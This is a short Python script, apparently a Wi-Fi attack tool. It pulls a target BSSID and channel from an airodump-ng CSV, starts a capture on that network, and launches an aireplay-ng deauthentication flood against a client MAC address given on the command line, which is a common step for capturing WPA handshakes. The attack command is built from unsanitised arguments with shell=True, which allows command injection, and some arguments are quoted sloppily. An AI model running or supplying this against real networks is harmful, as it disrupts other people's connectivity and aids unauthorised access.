import subprocess
import pandas as pd
import numpy as np
import time
import os
from pandas import DataFrame as df
import sys, select

data = pd.read_csv(" mon-01.csv")
x=df(data, columns=['BSSID'])
X=df(data, columns=[' channel'])

x=np.array(x)
X=np.array(X)
bsid=x[0][0]
Y=X[0][0]

cha=Y.strip()

oi=sys.argv[1]
iface=sys.argv[2]

pp= subprocess.Popen([f'airodump-ng', iface , '--bssid', bsid , '--channel', cha ,'-w mon' ], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
subprocess.run([f" aireplay-ng -0 15 -a {bsid} -c {oi} {iface} "],shell=True)